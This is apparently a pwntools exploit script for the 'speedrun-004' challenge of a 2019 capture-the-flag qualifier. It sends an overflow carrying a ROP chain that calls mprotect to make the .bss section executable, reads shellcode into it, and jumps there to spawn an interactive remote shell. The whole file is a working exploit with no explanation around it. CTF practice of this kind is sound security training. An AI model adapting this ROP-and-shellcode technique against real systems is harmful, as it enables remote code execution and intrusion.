from pwn import *
ret=0x0000000000400416
rdi=0x0000000000400686
rsi=0x0000000000410a93
rdx=0x000000000044a155
sys=0x0000000000474f15
bss=0x006b6000+0x800
rax=0x0000000000415f04
read=0x00000000044A140
#context.log_level='debug'
context.arch='amd64'
p=remote("speedrun-004.quals2019.oooverflow.io",31337)
#p=process('./speedrun-004')
#gdb.attach(p,'b *0x000000000400BD1')
p.sendlineafter("?\n",str(0x101))

pay=p64(ret)*15+p64(rdi)+p64(bss-0x800)+p64(rsi)+p64(0x1000)+p64(rdx)+p64(7)+p64(rax)+p64(0xa)+p64(sys)
pay+=p64(rdi)+p64(0)+p64(rsi)+p64(bss)+p64(rdx)+p64(0x40)+p64(read)+p64(bss)
pay+="\x30"
p.sendafter("?\n",pay)
p.sendline(asm(shellcraft.sh()))
p.interactive()
